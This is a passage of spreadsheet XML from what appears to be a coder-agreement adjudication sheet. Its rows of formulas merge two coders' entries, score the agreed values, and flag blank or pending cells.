        <f>IF(AND(Coder1!X57&amp;""&lt;&gt;"",Coder1!X57&amp;""=Coder2!X57&amp;""),Coder1!X57,"")</f>
        <v/>
      </c>
      <c r="Y57" s="14">
        <f>IF(AND(Coder1!Y57&amp;""&lt;&gt;"",Coder1!Y57&amp;""=Coder2!Y57&amp;""),Coder1!Y57,"")</f>
        <v/>
      </c>
      <c r="Z57" s="14">
        <f>IF(AND(Coder1!Z57&amp;""&lt;&gt;"",Coder1!Z57&amp;""=Coder2!Z57&amp;""),Coder1!Z57,"")</f>
        <v/>
      </c>
      <c r="AA57" s="14">
        <f>IF(AND(Coder1!AA57&amp;""&lt;&gt;"",Coder1!AA57&amp;""=Coder2!AA57&amp;""),Coder1!AA57,"")</f>
        <v/>
      </c>
      <c r="AB57" s="14">
        <f>IF(AND(Coder1!AB57&amp;""&lt;&gt;"",Coder1!AB57&amp;""=Coder2!AB57&amp;""),Coder1!AB57,"")</f>
        <v/>
      </c>
      <c r="AC57" s="14">
        <f>IF(AND(Coder1!AC57&amp;""&lt;&gt;"",Coder1!AC57&amp;""=Coder2!AC57&amp;""),Coder1!AC57,"")</f>
        <v/>
      </c>
      <c r="AD57" s="14">
        <f>IF(AND(Coder1!AD57&amp;""&lt;&gt;"",Coder1!AD57&amp;""=Coder2!AD57&amp;""),Coder1!AD57,"")</f>
        <v/>
      </c>
      <c r="AE57" s="14">
        <f>IF(AND(Coder1!AE57&amp;""&lt;&gt;"",Coder1!AE57&amp;""=Coder2!AE57&amp;""),Coder1!AE57,"")</f>
        <v/>
      </c>
      <c r="AF57" s="14">
        <f>IF(AND(Coder1!AF57&amp;""&lt;&gt;"",Coder1!AF57&amp;""=Coder2!AF57&amp;""),Coder1!AF57,"")</f>
        <v/>
      </c>
      <c r="AG57" s="14">
        <f>IF(AND(Coder1!AG57&amp;""&lt;&gt;"",Coder1!AG57&amp;""=Coder2!AG57&amp;""),Coder1!AG57,"")</f>
        <v/>
      </c>
      <c r="AH57" s="14">
        <f>IF(AND(Coder1!AH57&amp;""&lt;&gt;"",Coder1!AH57&amp;""=Coder2!AH57&amp;""),Coder1!AH57,"")</f>
        <v/>
      </c>
      <c r="AI57" s="11">
        <f>IF(COUNT(E57:L57)=0,"",SUM(E57:L57))</f>
        <v/>
      </c>
      <c r="AJ57" s="11">
        <f>IF(AI57="","",N(E57)*3+N(F57)*2+N(G57)*2+N(H57)*2+N(I57)*2+N(J57)*3+N(K57)*3+N(L57)*3)</f>
        <v/>
      </c>
      <c r="AK57" s="11">
        <f>IF(AI57="","",COUNTIF(N57:AG57,1))</f>
        <v/>
      </c>
      <c r="AL57" s="11">
        <f>IF(OR(AJ57="",AJ57=0),"",ROUND(100*(AJ57-AK57)/AJ57,1))</f>
        <v/>
      </c>
      <c r="AM57" s="11">
        <f>IF(AND(Coder1!AN57=1,Coder2!AN57=1),IF(COUNTBLANK(E57:AH57)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN57" s="11">
        <f>IF(AND(Coder1!AN57=1,Coder2!AN57=1),IF(SUMPRODUCT(--(Coder1!E57:AH57&amp;""&lt;&gt;Coder2!E57:AH57&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO57" s="11" t="n"/>
    </row>
    <row r="58">
      <c r="A58" s="11">
        <f>Coder1!A58</f>
        <v/>
      </c>
      <c r="B58" s="11">
        <f>Coder1!B58</f>
        <v/>
      </c>
      <c r="C58" s="11">
        <f>Coder1!C58</f>
        <v/>
      </c>
      <c r="D58" s="11">
        <f>Coder1!D58</f>
        <v/>
      </c>
      <c r="E58" s="14">
        <f>IF(AND(Coder1!E58&amp;""&lt;&gt;"",Coder1!E58&amp;""=Coder2!E58&amp;""),Coder1!E58,"")</f>
        <v/>
      </c>
      <c r="F58" s="14">
        <f>IF(AND(Coder1!F58&amp;""&lt;&gt;"",Coder1!F58&amp;""=Coder2!F58&amp;""),Coder1!F58,"")</f>
        <v/>
      </c>
      <c r="G58" s="14">
        <f>IF(AND(Coder1!G58&amp;""&lt;&gt;"",Coder1!G58&amp;""=Coder2!G58&amp;""),Coder1!G58,"")</f>
        <v/>
      </c>
      <c r="H58" s="14">
        <f>IF(AND(Coder1!H58&amp;""&lt;&gt;"",Coder1!H58&amp;""=Coder2!H58&amp;""),Coder1!H58,"")</f>
        <v/>
      </c>
      <c r="I58" s="14">
        <f>IF(AND(Coder1!I58&amp;""&lt;&gt;"",Coder1!I58&amp;""=Coder2!I58&amp;""),Coder1!I58,"")</f>
        <v/>
      </c>
      <c r="J58" s="14">
        <f>IF(AND(Coder1!J58&amp;""&lt;&gt;"",Coder1!J58&amp;""=Coder2!J58&amp;""),Coder1!J58,"")</f>
        <v/>
      </c>
      <c r="K58" s="14">
        <f>IF(AND(Coder1!K58&amp;""&lt;&gt;"",Coder1!K58&amp;""=Coder2!K58&amp;""),Coder1!K58,"")</f>
        <v/>
      </c>
      <c r="L58" s="14">
        <f>IF(AND(Coder1!L58&amp;""&lt;&gt;"",Coder1!L58&amp;""=Coder2!L58&amp;""),Coder1!L58,"")</f>
        <v/>
      </c>
      <c r="M58" s="14">
        <f>IF(AND(Coder1!M58&amp;""&lt;&gt;"",Coder1!M58&amp;""=Coder2!M58&amp;""),Coder1!M58,"")</f>
        <v/>
      </c>
      <c r="N58" s="14">
        <f>IF(AND(Coder1!N58&amp;""&lt;&gt;"",Coder1!N58&amp;""=Coder2!N58&amp;""),Coder1!N58,"")</f>
        <v/>
      </c>
      <c r="O58" s="14">
        <f>IF(AND(Coder1!O58&amp;""&lt;&gt;"",Coder1!O58&amp;""=Coder2!O58&amp;""),Coder1!O58,"")</f>
        <v/>
      </c>
      <c r="P58" s="14">
        <f>IF(AND(Coder1!P58&amp;""&lt;&gt;"",Coder1!P58&amp;""=Coder2!P58&amp;""),Coder1!P58,"")</f>
        <v/>
      </c>
      <c r="Q58" s="14">
        <f>IF(AND(Coder1!Q58&amp;""&lt;&gt;"",Coder1!Q58&amp;""=Coder2!Q58&amp;""),Coder1!Q58,"")</f>
        <v/>
      </c>
      <c r="R58" s="14">
        <f>IF(AND(Coder1!R58&amp;""&lt;&gt;"",Coder1!R58&amp;""=Coder2!R58&amp;""),Coder1!R58,"")</f>
        <v/>
      </c>
      <c r="S58" s="14">
        <f>IF(AND(Coder1!S58&amp;""&lt;&gt;"",Coder1!S58&amp;""=Coder2!S58&amp;""),Coder1!S58,"")</f>
        <v/>
      </c>
      <c r="T58" s="14">
        <f>IF(AND(Coder1!T58&amp;""&lt;&gt;"",Coder1!T58&amp;""=Coder2!T58&amp;""),Coder1!T58,"")</f>
        <v/>
      </c>
      <c r="U58" s="14">
        <f>IF(AND(Coder1!U58&amp;""&lt;&gt;"",Coder1!U58&amp;""=Coder2!U58&amp;""),Coder1!U58,"")</f>
        <v/>
      </c>
      <c r="V58" s="14">
        <f>IF(AND(Coder1!V58&amp;""&lt;&gt;"",Coder1!V58&amp;""=Coder2!V58&amp;""),Coder1!V58,"")</f>
        <v/>
      </c>
      <c r="W58" s="14">
        <f>IF(AND(Coder1!W58&amp;""&lt;&gt;"",Coder1!W58&amp;""=Coder2!W58&amp;""),Coder1!W58,"")</f>
        <v/>
      </c>
      <c r="X58" s="14">
        <f>IF(AND(Coder1!X58&amp;""&lt;&gt;"",Coder1!X58&amp;""=Coder2!X58&amp;""),Coder1!X58,"")</f>
        <v/>
      </c>
      <c r="Y58" s="14">
        <f>IF(AND(Coder1!Y58&amp;""&lt;&gt;"",Coder1!Y58&amp;""=Coder2!Y58&amp;""),Coder1!Y58,"")</f>
        <v/>
      </c>
      <c r="Z58" s="14">
        <f>IF(AND(Coder1!Z58&amp;""&lt;&gt;"",Coder1!Z58&amp;""=Coder2!Z58&amp;""),Coder1!Z58,"")</f>
        <v/>
      </c>
      <c r="AA58" s="14">
        <f>IF(AND(Coder1!AA58&amp;""&lt;&gt;"",Coder1!AA58&amp;""=Coder2!AA58&amp;""),Coder1!AA58,"")</f>
        <v/>
      </c>
      <c r="AB58" s="14">
        <f>IF(AND(Coder1!AB58&amp;""&lt;&gt;"",Coder1!AB58&amp;""=Coder2!AB58&amp;""),Coder1!AB58,"")</f>
        <v/>
      </c>
      <c r="AC58" s="14">
        <f>IF(AND(Coder1!AC58&amp;""&lt;&gt;"",Coder1!AC58&amp;""=Coder2!AC58&amp;""),Coder1!AC58,"")</f>
        <v/>
      </c>
      <c r="AD58" s="14">
        <f>IF(AND(Coder1!AD58&amp;""&lt;&gt;"",Coder1!AD58&amp;""=Coder2!AD58&amp;""),Coder1!AD58,"")</f>
        <v/>
      </c>
      <c r="AE58" s="14">
        <f>IF(AND(Coder1!AE58&amp;""&lt;&gt;"",Coder1!AE58&amp;""=Coder2!AE58&amp;""),Coder1!AE58,"")</f>
        <v/>
      </c>
      <c r="AF58" s="14">
        <f>IF(AND(Coder1!AF58&amp;""&lt;&gt;"",Coder1!AF58&amp;""=Coder2!AF58&amp;""),Coder1!AF58,"")</f>
        <v/>
      </c>
      <c r="AG58" s="14">
        <f>IF(AND(Coder1!AG58&amp;""&lt;&gt;"",Coder1!AG58&amp;""=Coder2!AG58&amp;""),Coder1!AG58,"")</f>
        <v/>
      </c>
      <c r="AH58" s="14">
        <f>IF(AND(Coder1!AH58&amp;""&lt;&gt;"",Coder1!AH58&amp;""=Coder2!AH58&amp;""),Coder1!AH58,"")</f>
        <v/>
      </c>
      <c r="AI58" s="11">
        <f>IF(COUNT(E58:L58)=0,"",SUM(E58:L58))</f>
        <v/>
      </c>
      <c r="AJ58" s="11">
        <f>IF(AI58="","",N(E58)*3+N(F58)*2+N(G58)*2+N(H58)*2+N(I58)*2+N(J58)*3+N(K58)*3+N(L58)*3)</f>
        <v/>
      </c>
      <c r="AK58" s="11">
        <f>IF(AI58="","",COUNTIF(N58:AG58,1))</f>
        <v/>
      </c>
      <c r="AL58" s="11">
        <f>IF(OR(AJ58="",AJ58=0),"",ROUND(100*(AJ58-AK58)/AJ58,1))</f>
        <v/>
      </c>
      <c r="AM58" s="11">
        <f>IF(AND(Coder1!AN58=1,Coder2!AN58=1),IF(COUNTBLANK(E58:AH58)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN58" s="11">
        <f>IF(AND(Coder1!AN58=1,Coder2!AN58=1),IF(SUMPRODUCT(--(Coder1!E58:AH58&amp;""&lt;&gt;Coder2!E58:AH58&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO58" s="11" t="n"/>
    </row>
    <row r="59">
      <c r="A59" s="11">
        <f>Coder1!A59</f>
        <v/>
      </c>
      <c r="B59" s="11">
        <f>Coder1!B59</f>
        <v/>
      </c>
      <c r="C59" s="11">
        <f>Coder1!C59</f>
        <v/>
      </c>
      <c r="D59" s="11">
        <f>Coder1!D59</f>
        <v/>
      </c>
      <c r="E59" s="14">
        <f>IF(AND(Coder1!E59&amp;""&lt;&gt;"",Coder1!E59&amp;""=Coder2!E59&amp;""),Coder1!E59,"")</f>
        <v/>
      </c>
      <c r="F59" s="14">
        <f>IF(AND(Coder1!F59&amp;""&lt;&gt;"",Coder1!F59&amp;""=Coder2!F59&amp;""),Coder1!F59,"")</f>
        <v/>
      </c>
      <c r="G59" s="14">
        <f>IF(AND(Coder1!G59&amp;""&lt;&gt;"",Coder1!G59&amp;""=Coder2!G59&amp;""),Coder1!G59,"")</f>
        <v/>
      </c>
      <c r="H59" s="14">
        <f>IF(AND(Coder1!H59&amp;""&lt;&gt;"",Coder1!H59&amp;""=Coder2!H59&amp;""),Coder1!H59,"")</f>
        <v/>
      </c>
      <c r="I59" s="14">
        <f>IF(AND(Coder1!I59&amp;""&lt;&gt;"",Coder1!I59&amp;""=Coder2!I59&amp;""),Coder1!I59,"")</f>
        <v/>
      </c>
      <c r="J59" s="14">
        <f>IF(AND(Coder1!J59&amp;""&lt;&gt;"",Coder1!J59&amp;""=Coder2!J59&amp;""),Coder1!J59,"")</f>
        <v/>
      </c>
      <c r="K59" s="14">
        <f>IF(AND(Coder1!K59&amp;""&lt;&gt;"",Coder1!K59&amp;""=Coder2!K59&amp;""),Coder1!K59,"")</f>
        <v/>
      </c>
      <c r="L59" s="14">
        <f>IF(AND(Coder1!L59&amp;""&lt;&gt;"",Coder1!L59&amp;""=Coder2!L59&amp;""),Coder1!L59,"")</f>
        <v/>
      </c>
      <c r="M59" s="14">
        <f>IF(AND(Coder1!M59&amp;""&lt;&gt;"",Coder1!M59&amp;""=Coder2!M59&amp;""),Coder1!M59,"")</f>
        <v/>
      </c>
      <c r="N59" s="14">
        <f>IF(AND(Coder1!N59&amp;""&lt;&gt;"",Coder1!N59&amp;""=Coder2!N59&amp;""),Coder1!N59,"")</f>
        <v/>
      </c>
      <c r="O59" s="14">
        <f>IF(AND(Coder1!O59&amp;""&lt;&gt;"",Coder1!O59&amp;""=Coder2!O59&amp;""),Coder1!O59,"")</f>
        <v/>
      </c>
      <c r="P59" s="14">
        <f>IF(AND(Coder1!P59&amp;""&lt;&gt;"",Coder1!P59&amp;""=Coder2!P59&amp;""),Coder1!P59,"")</f>
        <v/>
      </c>
      <c r="Q59" s="14">
        <f>IF(AND(Coder1!Q59&amp;""&lt;&gt;"",Coder1!Q59&amp;""=Coder2!Q59&amp;""),Coder1!Q59,"")</f>
        <v/>
      </c>
      <c r="R59" s="14">
        <f>IF(AND(Coder1!R59&amp;""&lt;&gt;"",Coder1!R59&amp;""=Coder2!R59&amp;""),Coder1!R59,"")</f>
        <v/>
      </c>
      <c r="S59" s="14">
        <f>IF(AND(Coder1!S59&amp;""&lt;&gt;"",Coder1!S59&amp;""=Coder2!S59&amp;""),Coder1!S59,"")</f>
        <v/>
      </c>
      <c r="T59" s="14">
        <f>IF(AND(Coder1!T59&amp;""&lt;&gt;"",Coder1!T59&amp;""=Coder2!T59&amp;""),Coder1!T59,"")</f>
        <v/>
      </c>
      <c r="U59" s="14">
        <f>IF(AND(Coder1!U59&amp;""&lt;&gt;"",Coder1!U59&amp;""=Coder2!U59&amp;""),Coder1!U59,"")</f>
        <v/>
      </c>
      <c r="V59" s="14">
        <f>IF(AND(Coder1!V59&amp;""&lt;&gt;"",Coder1!V59&amp;""=Coder2!V59&amp;""),Coder1!V59,"")</f>
        <v/>
      </c>
      <c r="W59" s="14">
        <f>IF(AND(Coder1!W59&amp;""&lt;&gt;"",Coder1!W59&amp;""=Coder2!W59&amp;""),Coder1!W59,"")</f>
        <v/>
      </c>
      <c r="X59" s="14">
        <f>IF(AND(Coder1!X59&amp;""&lt;&gt;"",Coder1!X59&amp;""=Coder2!X59&amp;""),Coder1!X59,"")</f>
        <v/>
      </c>
      <c r="Y59" s="14">
        <f>IF(AND(Coder1!Y59&amp;""&lt;&gt;"",Coder1!Y59&amp;""=Coder2!Y59&amp;""),Coder1!Y59,"")</f>
        <v/>
      </c>
      <c r="Z59" s="14">
        <f>IF(AND(Coder1!Z59&amp;""&lt;&gt;"",Coder1!Z59&amp;""=Coder2!Z59&amp;""),Coder1!Z59,"")</f>
        <v/>
      </c>
      <c r="AA59" s="14">
        <f>IF(AND(Coder1!AA59&amp;""&lt;&gt;"",Coder1!AA59&amp;""=Coder2!AA59&amp;""),Coder1!AA59,"")</f>
        <v/>
      </c>
      <c r="AB59" s="14">
        <f>IF(AND(Coder1!AB59&amp;""&lt;&gt;"",Coder1!AB59&amp;""=Coder2!AB59&amp;""),Coder1!AB59,"")</f>
        <v/>
      </c>
      <c r="AC59" s="14">
        <f>IF(AND(Coder1!AC59&amp;""&lt;&gt;"",Coder1!AC59&amp;""=Coder2!AC59&amp;""),Coder1!AC59,"")</f>
        <v/>
      </c>
      <c r="AD59" s="14">
        <f>IF(AND(Coder1!AD59&amp;""&lt;&gt;"",Coder1!AD59&amp;""=Coder2!AD59&amp;""),Coder1!AD59,"")</f>
        <v/>
      </c>
      <c r="AE59" s="14">
        <f>IF(AND(Coder1!AE59&amp;""&lt;&gt;"",Coder1!AE59&amp;""=Coder2!AE59&amp;""),Coder1!AE59,"")</f>
        <v/>
      </c>
      <c r="AF59" s="14">
        <f>IF(AND(Coder1!AF59&amp;""&lt;&gt;"",Coder1!AF59&amp;""=Coder2!AF59&amp;""),Coder1!AF59,"")</f>
        <v/>
      </c>
      <c r="AG59" s="14">
        <f>IF(AND(Coder1!AG59&amp;""&lt;&gt;"",Coder1!AG59&amp;""=Coder2!AG59&amp;""),Coder1!AG59,"")</f>
        <v/>
      </c>
      <c r="AH59" s="14">
        <f>IF(AND(Coder1!AH59&amp;""&lt;&gt;"",Coder1!AH59&amp;""=Coder2!AH59&amp;""),Coder1!AH59,"")</f>
        <v/>
      </c>
      <c r="AI59" s="11">
        <f>IF(COUNT(E59:L59)=0,"",SUM(E59:L59))</f>
        <v/>
      </c>
      <c r="AJ59" s="11">
        <f>IF(AI59="","",N(E59)*3+N(F59)*2+N(G59)*2+N(H59)*2+N(I59)*2+N(J59)*3+N(K59)*3+N(L59)*3)</f>
        <v/>
      </c>
      <c r="AK59" s="11">
        <f>IF(AI59="","",COUNTIF(N59:AG59,1))</f>
        <v/>
      </c>
      <c r="AL59" s="11">
        <f>IF(OR(AJ59="",AJ59=0),"",ROUND(100*(AJ59-AK59)/AJ59,1))</f>
        <v/>
      </c>
      <c r="AM59" s="11">
        <f>IF(AND(Coder1!AN59=1,Coder2!AN59=1),IF(COUNTBLANK(E59:AH59)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN59" s="11">
        <f>IF(AND(Coder1!AN59=1,Coder2!AN59=1),IF(SUMPRODUCT(--(Coder1!E59:AH59&amp;""&lt;&gt;Coder2!E59:AH59&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO59" s="11" t="n"/>
    </row>
    <row r="60">
      <c r="A60" s="11">
        <f>Coder1!A60</f>
        <v/>
      </c>
      <c r="B60" s="11">
        <f>Coder1!B60</f>
        <v/>
      </c>
      <c r="C60" s="11">
        <f>Coder1!C60</f>
        <v/>
      </c>
      <c r="D60" s="11">
        <f>Coder1!D60</f>
        <v/>
      </c>
      <c r="E60" s="14">
        <f>IF(AND(Coder1!E60&amp;""&lt;&gt;"",Coder1!E60&amp;""=Coder2!E60&amp;""),Coder1!E60,"")</f>
        <v/>
      </c>
      <c r="F60" s="14">
        <f>IF(AND(Coder1!F60&amp;""&lt;&gt;"",Coder1!F60&amp;""=Coder2!F60&amp;""),Coder1!F60,"")</f>
        <v/>
      </c>
      <c r="G60" s="14">
        <f>IF(AND(Coder1!G60&amp;""&lt;&gt;"",Coder1!G60&amp;""=Coder2!G60&amp;""),Coder1!G60,"")</f>
        <v/>
      </c>
      <c r="H60" s="14">
        <f>IF(AND(Coder1!H60&amp;""&lt;&gt;"",Coder1!H60&amp;""=Coder2!H60&amp;""),Coder1!H60,"")</f>
        <v/>
      </c>
      <c r="I60" s="14">
        <f>IF(AND(Coder1!I60&amp;""&lt;&gt;"",Coder1!I60&amp;""=Coder2!I60&amp;""),Coder1!I60,"")</f>
        <v/>
      </c>
      <c r="J60" s="14">
        <f>IF(AND(Coder1!J60&amp;""&lt;&gt;"",Coder1!J60&amp;""=Coder2!J60&amp;""),Coder1!J60,"")</f>
        <v/>
      </c>
      <c r="K60" s="14">
        <f>IF(AND(Coder1!K60&amp;""&lt;&gt;"",Coder1!K60&amp;""=Coder2!K60&amp;""),Coder1!K60,"")</f>
        <v/>
      </c>
      <c r="L60" s="14">
        <f>IF(AND(Coder1!L60&amp;""&lt;&gt;"",Coder1!L60&amp;""=Coder2!L60&amp;""),Coder1!L60,"")</f>
        <v/>
      </c>
      <c r="M60" s="14">
        <f>IF(AND(Coder1!M60&amp;""&lt;&gt;"",Coder1!M60&amp;""=Coder2!M60&amp;""),Coder1!M60,"")</f>
        <v/>
      </c>
      <c r="N60" s="14">
        <f>IF(AND(Coder1!N60&amp;""&lt;&gt;"",Coder1!N60&amp;""=Coder2!N60&amp;""),Coder1!N60,"")</f>
        <v/>
      </c>
      <c r="O60" s="14">
        <f>IF(AND(Coder1!O60&amp;""&lt;&gt;"",Coder1!O60&amp;""=Coder2!O60&amp;""),Coder1!O60,"")</f>
        <v/>
      </c>
      <c r="P60" s="14">
        <f>IF(AND(Coder1!P60&amp;""&lt;&gt;"",Coder1!P60&amp;""=Coder2!P60&amp;""),Coder1!P60,"")</f>
        <v/>
      </c>
      <c r="Q60" s="14">
        <f>IF(AND(Coder1!Q60&amp;""&lt;&gt;"",Coder1!Q60&amp;""=Coder2!Q60&amp;""),Coder1!Q60,"")</f>
        <v/>
      </c>
      <c r="R60" s="14">
        <f>IF(AND(Coder1!R60&amp;""&lt;&gt;"",Coder1!R60&amp;""=Coder2!R60&amp;""),Coder1!R60,"")</f>
        <v/>
      </c>
      <c r="S60" s="14">
        <f>IF(AND(Coder1!S60&amp;""&lt;&gt;"",Coder1!S60&amp;""=Coder2!S60&amp;""),Coder1!S60,"")</f>
        <v/>
      </c>
      <c r="T60" s="14">
        <f>IF(AND(Coder1!T60&amp;""&lt;&gt;"",Coder1!T60&amp;""=Coder2!T60&amp;""),Coder1!T60,"")</f>
        <v/>
      </c>
      <c r="U60" s="14">
        <f>IF(AND(Coder1!U60&amp;""&lt;&gt;"",Coder1!U60&amp;""=Coder2!U60&amp;""),Coder1!U60,"")</f>
        <v/>
      </c>
      <c r="V60" s="14">
        <f>IF(AND(Coder1!V60&amp;""&lt;&gt;"",Coder1!V60&amp;""=Coder2!V60&amp;""),Coder1!V60,"")</f>
        <v/>
      </c>
      <c r="W60" s="14">
        <f>IF(AND(Coder1!W60&amp;""&lt;&gt;"",Coder1!W60&amp;""=Coder2!W60&amp;""),Coder1!W60,"")</f>
        <v/>
      </c>
      <c r="X60" s="14">
        <f>IF(AND(Coder1!X60&amp;""&lt;&gt;"",Coder1!X60&amp;""=Coder2!X60&amp;""),Coder1!X60,"")</f>
        <v/>
      </c>
      <c r="Y60" s="14">
        <f>IF(AND(Coder1!Y60&amp;""&lt;&gt;"",Coder1!Y60&amp;""=Coder2!Y60&amp;""),Coder1!Y60,"")</f>
        <v/>
      </c>
      <c r="Z60" s="14">
        <f>IF(AND(Coder1!Z60&amp;""&lt;&gt;"",Coder1!Z60&amp;""=Coder2!Z60&amp;""),Coder1!Z60,"")</f>
        <v/>
      </c>
      <c r="AA60" s="14">
        <f>IF(AND(Coder1!AA60&amp;""&lt;&gt;"",Coder1!AA60&amp;""=Coder2!AA60&amp;""),Coder1!AA60,"")</f>
        <v/>
      </c>
      <c r="AB60" s="14">
        <f>IF(AND(Coder1!AB60&amp;""&lt;&gt;"",Coder1!AB60&amp;""=Coder2!AB60&amp;""),Coder1!AB60,"")</f>
        <v/>
      </c>
      <c r="AC60" s="14">
        <f>IF(AND(Coder1!AC60&amp;""&lt;&gt;"",Coder1!AC60&amp;""=Coder2!AC60&amp;""),Coder1!AC60,"")</f>
        <v/>
      </c>
      <c r="AD60" s="14">
        <f>IF(AND(Coder1!AD60&amp;""&lt;&gt;"",Coder1!AD60&amp;""=Coder2!AD60&amp;""),Coder1!AD60,"")</f>
        <v/>
      </c>
      <c r="AE60" s="14">
        <f>IF(AND(Coder1!AE60&amp;""&lt;&gt;"",Coder1!AE60&amp;""=Coder2!AE60&amp;""),Coder1!AE60,"")</f>
        <v/>
      </c>
      <c r="AF60" s="14">
        <f>IF(AND(Coder1!AF60&amp;""&lt;&gt;"",Coder1!AF60&amp;""=Coder2!AF60&amp;""),Coder1!AF60,"")</f>
        <v/>
      </c>
      <c r="AG60" s="14">
        <f>IF(AND(Coder1!AG60&amp;""&lt;&gt;"",Coder1!AG60&amp;""=Coder2!AG60&amp;""),Coder1!AG60,"")</f>
        <v/>
      </c>
      <c r="AH60" s="14">
        <f>IF(AND(Coder1!AH60&amp;""&lt;&gt;"",Coder1!AH60&amp;""=Coder2!AH60&amp;""),Coder1!AH60,"")</f>
        <v/>
      </c>
      <c r="AI60" s="11">
        <f>IF(COUNT(E60:L60)=0,"",SUM(E60:L60))</f>
        <v/>
      </c>
      <c r="AJ60" s="11">
        <f>IF(AI60="","",N(E60)*3+N(F60)*2+N(G60)*2+N(H60)*2+N(I60)*2+N(J60)*3+N(K60)*3+N(L60)*3)</f>
        <v/>
      </c>
      <c r="AK60" s="11">
        <f>IF(AI60="","",COUNTIF(N60:AG60,1))</f>
        <v/>
      </c>
      <c r="AL60" s="11">
        <f>IF(OR(AJ60="",AJ60=0),"",ROUND(100*(AJ60-AK60)/AJ60,1))</f>
        <v/>
      </c>
      <c r="AM60" s="11">
        <f>IF(AND(Coder1!AN60=1,Coder2!AN60=1),IF(COUNTBLANK(E60:AH60)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN60" s="11">
        <f>IF(AND(Coder1!AN60=1,Coder2!AN60=1),IF(SUMPRODUCT(--(Coder1!E60:AH60&amp;""&lt;&gt;Coder2!E60:AH60&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO60" s="11" t="n"/>
    </row>
    <row r="61">
      <c r="A61" s="11">
        <f>Coder1!A61</f>
        <v/>
      </c>
      <c r="B61" s="11">
        <f>Coder1!B61</f>
        <v/>
      </c>
      <c r="C61" s="11">
        <f>Coder1!C61</f>
        <v/>
      </c>
      <c r="D61" s="11">
        <f>Coder1!D61</f>
        <v/>
      </c>
      <c r="E61" s="14">
        <f>IF(AND(Coder1!E61&amp;""&lt;&gt;"",Coder1!E61&amp;""=Coder2!E61&amp;""),Coder1!E61,"")</f>
        <v/>
      </c>
      <c r="F61" s="14">
        <f>IF(AND(Coder1!F61&amp;""&lt;&gt;"",Coder1!F61&amp;""=Coder2!F61&amp;""),Coder1!F61,"")</f>
        <v/>
      </c>
      <c r="G61" s="14">
        <f>IF(AND(Coder1!G61&amp;""&lt;&gt;"",Coder1!G61&amp;""=Coder2!G61&amp;""),Coder1!G61,"")</f>
        <v/>
      </c>
      <c r="H61" s="14">
        <f>IF(AND(Coder1!H61&amp;""&lt;&gt;"",Coder1!H61&amp;""=Coder2!H61&amp;""),Coder1!H61,"")</f>
        <v/>
      </c>
      <c r="I61" s="14">
        <f>IF(AND(Coder1!I61&amp;""&lt;&gt;"",Coder1!I61&amp;""=Coder2!I61&amp;""),Coder1!I61,"")</f>
        <v/>
      </c>
      <c r="J61" s="14">
        <f>IF(AND(Coder1!J61&amp;""&lt;&gt;"",Coder1!J61&amp;""=Coder2!J61&amp;""),Coder1!J61,"")</f>
        <v/>
      </c>
      <c r="K61" s="14">
        <f>IF(AND(Coder1!K61&amp;""&lt;&gt;"",Coder1!K61&amp;""=Coder2!K61&amp;""),Coder1!K61,"")</f>
        <v/>
      </c>
      <c r="L61" s="14">
        <f>IF(AND(Coder1!L61&amp;""&lt;&gt;"",Coder1!L61&amp;""=Coder2!L61&amp;""),Coder1!L61,"")</f>
        <v/>
      </c>
      <c r="M61" s="14">
        <f>IF(AND(Coder1!M61&amp;""&lt;&gt;"",Coder1!M61&amp;""=Coder2!M61&amp;""),Coder1!M61,"")</f>
        <v/>
      </c>
      <c r="N61" s="14">
        <f>IF(AND(Coder1!N61&amp;""&lt;&gt;"",Coder1!N61&amp;""=Coder2!N61&amp;""),Coder1!N61,"")</f>
        <v/>
      </c>
      <c r="O61" s="14">
        <f>IF(AND(Coder1!O61&amp;""&lt;&gt;"",Coder1!O61&amp;""=Coder2!O61&amp;""),Coder1!O61,"")</f>
        <v/>
      </c>
      <c r="P61" s="14">
        <f>IF(AND(Coder1!P61&amp;""&lt;&gt;"",Coder1!P61&amp;""=Coder2!P61&amp;""),Coder1!P61,"")</f>
        <v/>
      </c>
      <c r="Q61" s="14">
        <f>IF(AND(Coder1!Q61&amp;""&lt;&gt;"",Coder1!Q61&amp;""=Coder2!Q61&amp;""),Coder1!Q61,"")</f>
        <v/>
      </c>
      <c r="R61" s="14">
        <f>IF(AND(Coder1!R61&amp;""&lt;&gt;"",Coder1!R61&amp;""=Coder2!R61&amp;""),Coder1!R61,"")</f>
        <v/>
      </c>
      <c r="S61" s="14">
        <f>IF(AND(Coder1!S61&amp;""&lt;&gt;"",Coder1!S61&amp;""=Coder2!S61&amp;""),Coder1!S61,"")</f>
        <v/>
      </c>
      <c r="T61" s="14">
        <f>IF(AND(Coder1!T61&amp;""&lt;&gt;"",Coder1!T61&amp;""=Coder2!T61&amp;""),Coder1!T61,"")</f>
        <v/>
      </c>
      <c r="U61" s="14">
        <f>IF(AND(Coder1!U61&amp;""&lt;&gt;"",Coder1!U61&amp;""=Coder2!U61&amp;""),Coder1!U61,"")</f>
        <v/>
      </c>
      <c r="V61" s="14">
        <f>IF(AND(Coder1!V61&amp;""&lt;&gt;"",Coder1!V61&amp;""=Coder2!V61&amp;""),Coder1!V61,"")</f>
        <v/>
      </c>
      <c r="W61" s="14">
        <f>IF(AND(Coder1!W61&amp;""&lt;&gt;"",Coder1!W61&amp;""=Coder2!W61&amp;""),Coder1!W61,"")</f>
        <v/>
      </c>
      <c r="X61" s="14">
        <f>IF(AND(Coder1!X61&amp;""&lt;&gt;"",Coder1!X61&amp;""=Coder2!X61&amp;""),Coder1!X61,"")</f>
        <v/>
      </c>
      <c r="Y61" s="14">
        <f>IF(AND(Coder1!Y61&amp;""&lt;&gt;"",Coder1!Y61&amp;""=Coder2!Y61&amp;""),Coder1!Y61,"")</f>
        <v/>
      </c>
      <c r="Z61" s="14">
        <f>IF(AND(Coder1!Z61&amp;""&lt;&gt;"",Coder1!Z61&amp;""=Coder2!Z61&amp;""),Coder1!Z61,"")</f>
        <v/>
      </c>
      <c r="AA61" s="14">
